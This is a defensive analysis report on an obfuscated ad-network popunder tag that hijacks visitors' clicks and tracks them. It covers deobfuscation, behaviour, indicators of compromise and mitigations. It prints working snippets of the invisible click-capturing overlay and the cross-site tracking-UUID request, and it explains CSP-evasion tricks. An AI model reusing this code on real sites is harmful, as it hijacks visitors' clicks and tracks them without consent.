# Analysis report — PropellerAds `sfp.js` smart-popunder tag

- **Analyst tool:** reaper
- **Date:** 2026-05-15
- **Sample family:** PropellerAds / Adsterra / RollerAds "Smart Full Page" (`sfp.js`) popunder + click-hijack tag
- **Targeting:** desktop and mobile visitors to compromised or monetized WordPress sites (the bootstrap config has `isWordPress: true`)
- **Companion files:** `README.md` (walkthrough), `SHA256SUMS` (artifact integrity), `artifacts/` (every payload referenced below)

## 1. Sample identification

| Artifact | Path | Size | SHA-256 |
|---|---|---|---|
| Obfuscated original | `artifacts/payload.js` | 97 676 B | `94f4faa517a690d2424d08ed7b772a8b61924f313b7f8ea4d29c3d5eebe1215b` |
| Reaper-rewritten plaintext | `artifacts/payload.deobf.js` | 142 758 B | `b228961bb1ff4f59eda6e1d27710d0021aaf447b2119b1fb5537dcb6b9e9e97f` |
| Extracted bootstrap config | `artifacts/placement-config.json` | 3 213 B | `1b710ab8fc78f356b35e3fba5902bc4c56e6bed973bedc02eed29c1691921f6a` |
| Network indicators | `artifacts/iocs.txt` | 1 532 B | `60c141181f60acf28284bba6ca233ba5e3ed43bf439bd172b3915fbc4af65ee1` |

The original file is named `1285133f2f3d4bffd19ce5188f677353.js` in the wild — the basename is an MD5-shaped string that the embedded code reveals to be the publisher's **`placementKey`**. The network publishes its tag under that name from a small rotating pool of throwaway hostnames, so the same identifier turning up on another site is a strong correlation signal even when the host has rotated.

## 2. Executive summary

This is a **monetization tag**, not malware in the binary-RCE sense, but it is unambiguously hostile to the visitor:

1. It overlays an invisible viewport-filling `<a target="_blank">` that hijacks the next click on the page and routes it to an attacker-billable ad URL (`createTransparentLayer`, `payload.deobf.js` line ~1638).
2. It registers a back-button hijack with cooldown caps (`backButtonRedirectsPeriod = 24h`, `Max = 2`), so a victim pressing "back" gets a redirected popunder instead of the previous page.
3. It runs a JavaScript-fingerprinting and bot-detection scorer (`window.LieDetector`) that probes plugins, fonts, Notification API, custom protocol handlers, `MSInputMethodContext`, `SharedWorker`, performance timing, screen dimensions, and a half-dozen UA-consistency lies. The result is uploaded as `&res=` to the ad-fetch URL so the network can filter bot traffic before it's billed.
4. It silently issues a per-visitor UUID against `protrafficinspector.com/stats` (`withCredentials: true`), stores it in a 7-day cookie keyed to the page's eTLD+1, and echoes it back to every subsequent ad request — defeating naive incognito-mode privacy.
5. It transmits four classes of beacon (success, click, network-timing, error) to `drainalmost.com/pixel/*` via `new Image().src = ...`. Pixel beacons bypass CORS and `connect-src` CSP and leave no `fetch`/XHR network entry.
6. It uses a `MutationObserver({childList: true, subtree: true})` to re-arm the overlay on SPA route changes, so the hijack survives client-side navigation.

The script is heavily obfuscated with **obfuscator.io's string-array scheme**, plus an anti-tamper `RegExp.toString().search` self-defense guard, plus per-function identifier aliases for the decoder. Reaper recovered the full plaintext statically: **2 355 of 2 355 wrapper/alias calls inlined (100 %)**, with 378 identifier aliases resolved transitively.

## 3. Obfuscation, stage by stage

### 3.1 String-array IIFE

The whole file is wrapped in a single `(function () { ... })()` IIFE. Inside, three FunctionDeclarations cooperate to hide every string literal:

1. **String table.** `function pqkm2o2() { var fL = ['hasCustomProtocolHandler', '(((.+)+)+)+$', ..., '2026.5.0', 'ipad', 'left']; pqkm2o2 = function () { return fL; }; return pqkm2o2(); }` — roughly 510 entries. The fn is declared at the *bottom* of the IIFE body (line 2944 of the rewritten file), not the top. This deliberately violates the program-body-level assumption of older string-array detectors.
2. **Root decoder.** `function pqkm2o3(o, k) { o = o - 0x1ec; var n = pqkm2o2(); var z = n[o]; return z; }` — a *simple-subtract* decoder. This is the older obfuscator.io shape that does not self-rewrite on first call; the parameter `k` is unused, present only to keep the calling convention consistent with the rotator. Many detectors look for the self-rewriting pattern (`return SELF = function(...)...`) and miss this one.
3. **Rotator IIFE.** `(function (o, k) { var Ne = pqkm2o3, n = o(); while (!![]) { try { var z = -parseInt("1130996fVEILR") / 1 * (parseInt("2pTeYGf") / 2) + ...; if (z === k) break; else n.push(n.shift()); } catch (D) { ... } } }(pqkm2o2, 0xdf895))` — runs until a sum of decoy `parseInt`s matches the magic `0xdf895`, shifting the array until then. The leading digits of each decoy (`1130996`, `2`, `4213419`, `4`, `190715`, `66`, `3320149`, `1122152`, `45`, `17681760`, `86317`, `2868`) are the real values; the trailing letters are noise discarded by `parseInt`. The rotator is embedded inside a SequenceExpression (`(rotator, !nextIife)`), not a standalone ExpressionStatement.

### 3.2 Self-defense

`oa()` (rewritten line 65) installs the obfuscator's standard anti-tamper:

```js
DM = ob(this, function () {
  return DM.toString().search("(((.+)+)+)+$")
           .toString().constructor(DM).search("(((.+)+)+)+$");
});
DM();
```

`(((.+)+)+)+$` is a catastrophic-backtracking regex used as a stalling mechanism — if a beautifier or instrumented runtime has changed the function's `.toString()` shape, this guard either throws or runs indefinitely. With the strings inlined but the function nodes still in place, the guard short-circuits on the original (still-obfuscated) decoder body. Reaper's rewriter leaves the scaffolding intact for nested cases like this, so the rewritten file runs to the same point as the original (modulo the strings being plaintext).

### 3.3 Identifier aliases

Every meaningful function in the IIFE opens with `var <2-3 char> = pqkm2o3;` and calls the alias rather than the decoder by name. The rewritten source has **378 such aliases** (`Ne, Ni, NX, Nw, Nf, NL, Ns, NR, NV, NI, Nq, NF, Nm, NU, NT, NE, Nl, Nh, Nt, Nb, ...`), each scoped to a single function. This scattering is the obfuscator's defense against naive name-based detection — any rewriter that grep-matches `pqkm2o3(0xNNN)` will find essentially nothing. Reaper resolves aliases transitively via `src/analyzers/stringarray.ts`'s alias pass, then routes each alias call to the root decoder at substitution time.

## 4. What the deobfuscated payload actually does

The rewritten file is 142 758 B across 2 949 lines and 128 reachable functions, all alive (verified via `reaper --reachability`). The behavior partitions into nine subsystems.

### 4.1 Bootstrap config (`DL` placeholders table)

`payload.deobf.js` lines ~2260–2441 define a `DL` map of bootstrap "placeholders" with hard-coded defaults:

| Key | Default | Role |
|---|---|---|
| `placementKey` | `1285133f2f3d4bffd19ce5188f677353` | Publisher billing key; matches the filename |
| `invBackId` | `019e2d22-28fa-7992-b916-45655d005531` | Publisher account UUID |
| `templateId` | `70` | Ad template style |
| `buildVersion` | `2026.5.0` | sfp.js build tag |
| `invokeDomain` | `drainalmost.com` | Pixel beacon host |
| `adsDomain` | `realizationnewestfangs.com` | Primary creative-fetch host |
| `oldestDomainFromList` | `skinnycrawlinglax.com` | Fallback creative host |
| `userIdCookieDomain` | `protrafficinspector.com` | UUID issuer |
| `fingerprintDomain` | `preferencenail.com` | Bot-score upload |
| `adsPath` | `mh03r2fd70` | Path on creative host |
| `delay` / `initDelay` | 10 / 0 (seconds) | Display delays |
| `maxPerPage` / `maxPerPeriod` / `period` | 1 / 4 / 2h | Frequency caps |
| `backButtonRedirectsPeriod` / `…Max…` | 24h / 2 | Back-button cap |
| `plTagListExcludeIds` | `[4,12,27,31,32,35,55,60,68,73,74,80,89,188,190]` | Banned ad-tag IDs |
| `plCategoryId` | 3 | Publisher content category |
| `isWordPress` | true | Site-type marker |
| `isSwipe` | true | Mobile swipe-hijack enabled |
| `enableAggressiveBb` | true | Aggressive back-button hijack enabled |
| `addFingerprint` | true | Fingerprint upload enabled |

A host page that wants to override any of these would assign them on a `window.placeholdersConfig` object before `sfp.js` runs; in the absence of overrides the hard-coded defaults apply. The defaults are the publisher's billing fingerprint.

### 4.2 Click hijack — transparent overlay

The core monetization mechanic, at `payload.deobf.js` line ~1638:

```js
createTransparentLayer: function () {
  if (document.getElementById(Du.transpLayerId) !== null) return;
  Du.prepareURL();
  const div = document.createElement('div');
  const a   = document.createElement('a');
  div.id = Du.transpLayerId;
  div.style.setProperty('--rdata', Du.transpLayerId);
  div.style.position   = 'fixed';
  div.style.top = '0'; div.style.bottom = '0';
  div.style.left = '0'; div.style.right  = '0';
  div.style.zIndex     = '2147483650';   // INT32_MAX + 2 — beats every legitimate site
  div.style.background = 'black';
  div.style.opacity    = '0.01';         // visually invisible, still clickable
  div.style.height = Du.brs.screen.GetWindowHeight() + 'px';
  div.style.width  = Du.brs.screen.GetWindowWidth()  + 'px';
  a.id   = Du.transpLinkId;
  a.href = Du.url.getUrl();
  a.target = '_blank';
  a.style.display = 'block';
  a.style.height  = 'inherit';
  div.appendChild(a);
  document.body.appendChild(div);
}
```

`zIndex: 2147483650` is `INT32_MAX + 2` — chosen specifically to defeat any site that uses `zIndex: 2147483647` for its own modal overlays. `opacity: 0.01` makes the layer effectively invisible while remaining click-receptive. The next genuine click anywhere on the page is silently captured by the `<a target="_blank">` and opens the ad URL in a new tab.

The IDs are randomized per page load: `transpLinkId = 'lk' + Math.random().toString(36).substr(10)`, `transpLayerId = <random lowercase letter> + Math.random().toString(36).substr(3, 6)`.

For Chrome ≥ 78 and iOS ≥ 13 the layer is removed 500 ms after click (so the visitor sees the underlying page recover); on older browsers the overlay persists. `windowOpenerNull()` is then called on the spawned tab to set `window.opener = null`, breaking the new tab's ability to navigate the original page — and also breaking the referrer chain back to the publisher.

### 4.3 Back-button hijack

`backButtonHandler.init` registers a `popstate` listener and a `history.pushState` shim. On back-press, if the per-period cap (`backButtonRedirectsMaxPerPeriod = 2` within `backButtonRedirectsPeriod = 24h`) has not been hit, the listener calls `location.assign(<ad-url>)` instead of letting the navigation proceed. Storage keys `pp_main_<placementKey>`, `pp_sub_<…>`, `pp_clicks_<…>` track the period state in both `localStorage` and a cookie fallback.

### 4.4 Mobile swipe / tap pathway

`isSwipe: true` enables a separate handler. `addMobileEventListener` attaches `touchstart` / `touchmove` / `touchend` with `capture: true` on `document`. A small swipe distance triggers `artificialClick`, which calls `preventDefault` on the user's real touch event and synthesizes the popunder open. iOS gets a separate `preventIosClick` path because of Safari's stricter `window.open` gesture-attribution rules.

### 4.5 LieDetector — bot scoring

`window.LieDetector.runTests().getResults()` is a fingerprint-and-classify scorer. The probes (all visible in the rewritten source):

- `hasLiedBrowser`, `hasLiedLanguage`, `hasLiedOs`, `hasLiedResolution` — cross-check `navigator.userAgent` against `navigator.platform`, `navigator.languages[0]`, `navigator.oscpu`, and `screen.{width,height,availWidth,availHeight}` for self-inconsistency.
- `hasDevToolsOpen`, `Firebug` — DOM-size and `console.profileEnd` tells.
- Plugin/MIME consistency checks (`navigator.plugins`, `productSub`, `vendor`).
- Touch-support consistency (`maxTouchPoints`, `msMaxTouchPoints`, `ontouchstart`).
- `MSInputMethodContext`, `StyleMedia`, `documentMode` — browser-fingerprinting tells for IE/Edge vs spoof.
- `SharedWorker`, `Notification`, `registerProtocolHandler`, `hasCustomProtocolHandler`, `hasFileInputMultiple` — API surface fingerprint.
- `performance.getEntriesByType('resource')` — timing-sanity check, looks for navigation patterns inconsistent with a real browser load.

`isEmulate()` returns true if more than half of the lie-detector signals fire. The verdict is appended to the ad-fetch URL as `&dev=e` (emulated) or `&dev=r` (real); the underlying point vectors are joined into `&res=<string>` for server-side analytics. This is the network's primary anti-fraud signal — bot traffic is filtered out *before* the publisher is paid.

### 4.6 Persistent visitor UUID

On first visit (`payload.deobf.js` lines ~2353–2381):

```js
const xhr = new XMLHttpRequest();
xhr.open('GET', 'https://' + placeholders.userIdCookieDomain + '/stats', true);
if ('withCredentials' in xhr) xhr.withCredentials = true;
xhr.timeout = 1000;
xhr.onload = () => {
  const uuid = encodeURIComponent(xhr.responseText.trim());
  const exp  = new Date(); exp.setTime(exp.getTime() + 7 * 86400 * 1000);
  storage.setItem(nD, uuid, exp.toUTCString(), zL(window.location.hostname));
};
xhr.ontimeout = xhr.onerror = () => window.mm.sendErrorMetrics('UUID request timed out or failed');
xhr.send();
```

The host `protrafficinspector.com/stats` returns a per-visitor identifier in the response body. The result is URL-encoded, stored in a cookie under the page's eTLD+1 with a 7-day expiry and `SameSite=Lax`, and echoed in every subsequent ad request as `&uuid=`. Because the cookie is keyed to the *page's* origin (not the tracker's), it survives third-party cookie blocking on most browsers — clearing site data on the page also clears the tracker's grip, but the per-visitor identifier remains stable across incognito-mode visits that come back to the same publisher.

### 4.7 Beacon endpoints

All four beacons hit `https://<invokeDomain>/pixel/*` via `new Image().src = ...`, which bypasses CORS, `connect-src` CSP, and leaves no `fetch` / XHR network entry — only an image-load record:

| Endpoint | Trigger | Query / body |
|---|---|---|
| `purst?...` | `sendNetworkMetrics()` after first ad-script load | `dl, th, sc, rs, rd, fd` (DNS/TCP/SSL/TTFB/req/total ms from `PerformanceResourceTiming`) + `bv`, `tmpl` |
| `purs?tmpl=<id>&bv=<ver>` | `sendSuccessfulExecutionMetrics()` after overlay armed | — |
| `puclc?tmpl=<id>&bv=<ver>&plk=<key>` | `sendClickMetrics()` when overlay catches a click | — |
| `pure` (POST, `application/json`) | `sendErrorMetrics(msg)` on any caught error | `{bv, error, tmpl}` |

The error reporter is the only beacon that is *not* an Image-src pixel — it uses `XMLHttpRequest` with `Content-Type: application/json`. This makes errors visible in the browser's Network panel even when the success beacons are not.

### 4.8 Creative-fetch URL builder

The actual ad creative is fetched by `generateUrl()` + `getQuery()` + `getPsid()`:

```
https://<adsDomain>/<adsPath>?
    <page-title keywords as &kw=>
    &key=<placementKey>
    &scrWidth=<screen.width>
    &scrHeight=<screen.height>
    &tz=<-getTimezoneOffset/60>
    &ship=1
    &v=<buildVersion>
    [&abt=<abPlacementSubId>]
    &sub3=invoke_layer
    &res=<LieDetector.runTests().getResults()>
    &dev=<e|r>
    &ifid=<UUIDv7>
    &ibid=<invBackId>
    [&psid=<persistentSessionId>]
    [&uuid=<serverIssuedUUID>]
```

`&kw=` is built from `<title>` of `window.top.document` (falling back to the local iframe `<title>` if cross-origin), tokenized to `[a-z0-9 -퟿豈-﷏ﷰ-￯+-]+`, deduplicated via `Set`, JSON-stringified, URL-encoded. This is *contextual* ad targeting — the publisher's own page title becomes the keyword vector.

### 4.9 SPA re-arming

A `MutationObserver({childList: true, subtree: true})` is attached to `document.body` (`initSpaObserver`). On any subtree mutation, the click-hijack overlay is re-attached if it has been removed. This survives client-side navigation in React / Vue / Angular sites that don't trigger a real page reload.

## 5. Methodology — reaper features exercised

1. **String-array rewriter** (`src/analyzers/stringarray.ts`). The detector handles three obfuscator-family pattern variations:
    - The decoder, array fn, and rotator are nested inside an outer `(function(){...})()` IIFE — the discovery helpers now traverse the full AST rather than only `program.body`.
    - The decoder uses the *simple-subtract* shape (`o = o - K; var n = arr(); return n[o]`) with no self-rewrite — the older obfuscator.io shape, recognised alongside the self-rewriting variant.
    - All 2 355 call sites go through 378 per-function *identifier aliases* (`var Ne = pqkm2o3`) rather than wrapper functions. The detector now collects aliases transitively across the whole AST and routes alias calls to the root decoder at substitution time.

   This sample was the motivating case for the alias / IIFE-nested / simple-subtract extensions in reaper 0.1.2.

2. **Default static scan.** Surfaces the 18 `Unreachable code after return` findings (dead branches inside `try {... return ...}` blocks in the rotator), 12 unused variables (stale eval-result holders), and 9 `['constructor']` bracket-access obfuscation tells.

3. **IOC extraction (`-i`).** Before rewriting, finds only the five plaintext domains that survived as bare string literals. After rewriting, the same command pulls the full beacon-path inventory and the build version.

4. **Reachability analysis (`-r`).** Confirms all 128 functions in the rewritten source are reachable from at least one auto-detected entry point — there are no dead behaviour branches the obfuscator left for future use.

5. **Dynamic sandbox (`scripts/analyze.sh --observe-network`).** Captures the exact pixel-beacon URLs and the `/stats` UUID request as `[REAPER]` log lines with no real network egress. Confirms statically-derived endpoints.

## 6. Indicators

### 6.1 Network

| Type | Value | Role |
|---|---|---|
| Domain | `drainalmost.com` | `invokeDomain` — beacon pixel host (`/pixel/*`) |
| Domain | `realizationnewestfangs.com` | `adsDomain` — primary ad creative endpoint |
| Domain | `skinnycrawlinglax.com` | `oldestDomainFromList` — fallback creative host |
| Domain | `protrafficinspector.com` | `userIdCookieDomain` — UUID issuer (`/stats`) |
| Domain | `preferencenail.com` | `fingerprintDomain` — bot-score upload |
| Path | `/pixel/purs` | success beacon |
| Path | `/pixel/puclc` | click beacon |
| Path | `/pixel/purst` | network-timing beacon |
| Path | `/pixel/pure` | error report (POST JSON) |
| Path | `/stats` | UUID issuance (GET, `withCredentials: true`) |
| Path | `/mh03r2fd70` | `adsPath` — creative fetch path on adsDomain |

The five domain entries are the strongest IOCs and should go straight into any DNS / proxy blocklist. The five path entries are stable across host rotations and are useful as URL-pattern signatures.

### 6.2 Publisher identifiers

| Type | Value | Role |
|---|---|---|
| ID | `1285133f2f3d4bffd19ce5188f677353` | `placementKey` — also the filename |
| ID | `019e2d22-28fa-7992-b916-45655d005531` | `invBackId` — publisher account UUID |
| ID | `70` | `templateId` |
| Build | `2026.5.0` | `sfp.js` build tag |

These are *publisher-scoped* indicators — finding the same `placementKey` on a different host means the same publisher account is monetizing both. The `invBackId` is one level above placement and binds multiple `placementKey`s to a single network account.

### 6.3 Browser-side storage fingerprint

The script's `localStorage` and cookie keys all use these prefixes (suffixed with `<placementKey>`):

- `pp_main_`, `pp_sub_`, `pp_clicks_`, `pp_delay_`, `pp_idelay_`, `pp_exp_`, `pp_show_on_`, `total_count_`

A browser that has visited a page hosting this tag will have these keys for ~7 days even after the page is closed. An extension or audit script searching browser storage for `pp_main_<32-hex>` can identify exposed visitors.

## 7. Mitigations and detections

- **Content Security Policy (highest leverage).** A strict CSP that disallows `connect-src` to non-allowlisted hosts and `img-src` to non-allowlisted hosts will block both the `XMLHttpRequest` to `protrafficinspector.com/stats` and every `/pixel/*` Image-src beacon. The pixel beacons are the harder case — they bypass `connect-src` (which is why the network chose Image-src in the first place), so explicit `img-src` restrictions are required.
- **DNS / proxy egress.** Block all five domains listed in §6.1. None has any legitimate purpose. If false positives are a concern, blocking just `drainalmost.com` (the beacon host) breaks attribution while leaving creative fetches working, which can be a useful "monitor without blocking" stance during evaluation.
- **Browser extension / userscript.** An overlay-hunter that walks `document.body.children` looking for `position: fixed`, viewport-sized elements with `opacity` below ~0.1 and a top-level `<a target="_blank">` child will catch this hijack (and many of its cousins) regardless of host rotation. Pair with a `MutationObserver` of its own to defeat the SPA re-arming.
- **Static content scanning.** Grep stored HTML and site backups for `<script src="…1285133f2f3d4bffd19ce5188f677353.js">` and for `<script src="…sfp.js">`. The MD5-named filename pattern (`[a-f0-9]{32}\.js`) on a third-party host is itself unusual outside the ad-tech industry.
- **Origin server.** This payload is most commonly injected on WordPress sites either intentionally (publisher signed up for PropellerAds and pasted the snippet) or compromised (vulnerable plugin, stolen admin creds, or `wp_options.option_value` injection). Check `wp_posts`, active theme template files, and the `wp_options` table for unexpected `<script src=` insertions.
- **For publishers who chose to install this.** This tag is sold as a "smart" or "anti-adblock" monetization product. It is hostile to your visitors: it hijacks their clicks, fingerprints them, breaks the back button, and tracks them across sessions. Removing it is a one-line change.

## 8. Limitations

- The **ad creative URLs** served by `realizationnewestfangs.com` were not retrieved. Doing so would require a real GET against attacker-tier infrastructure with a constructed UUID and would put the analyst host on the network's visitor list. The structure of those URLs is documented from the source; the *content* (which advertiser, which destination) is out of scope.
- **The `oa()` anti-tamper guard** is only short-circuited *if* the rewritten file is executed as-is. The committed `payload.deobf.js` is intended for reading — running it in a browser will still execute the hijack on real visitor input. No executable copies of the rewritten payload should be served.
- **Operator infrastructure rotation** is expected. The same `placementKey` (`1285133f2f3d4bffd19ce5188f677353`) and the same `invBackId` (`019e2d22-…`) can re-appear behind different hostnames; the placement-and-account identifiers in §6.2 are more durable than the domains in §6.1. Conversely, a domain rotation with a new `placementKey` is a *different* publisher monetizing through the same network — useful to know when triaging.
- The **specific PropellerAds account** behind `invBackId=019e2d22-…` is not in scope. Attribution at the operator-account level requires either purchase records, network-side disclosure, or correlation across many compromised hosts. Reaper recovers the in-binary identifiers; tying them to a real entity is a separate analysis.
